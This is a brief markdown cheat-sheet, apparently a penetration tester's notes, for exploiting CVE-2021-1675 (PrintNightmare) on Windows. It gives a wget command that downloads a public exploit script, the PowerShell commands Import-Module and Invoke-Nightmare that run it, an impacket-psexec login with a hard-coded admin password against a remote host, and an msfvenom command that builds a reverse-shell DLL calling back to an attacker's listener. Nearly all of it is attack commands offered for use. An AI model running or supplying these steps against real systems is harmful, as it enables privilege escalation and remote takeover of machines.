# CVE-2021-1675

## check if vulnerable

https://github.com/cybersecurityworks553/CVE-2021-1675_PrintNightMare

## local priv esc 

see https://github.com/puckiestyle/CVE-2021-1675/blob/main/readme2.md

```bash
wget https://github.com/puckiestyle/CVE-2021-1675/raw/main/CVE-2021-1675.ps1
```

```cmd
Import-Module .\cve-2021-1675.ps1
Invoke-Nightmare
```

```bash
impacket-psexec adm1n:P\@ssw0rd@"$rhost"
```

## probably a dll is needed

msfvenom -p windows/x64/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f dll -o rev.dll
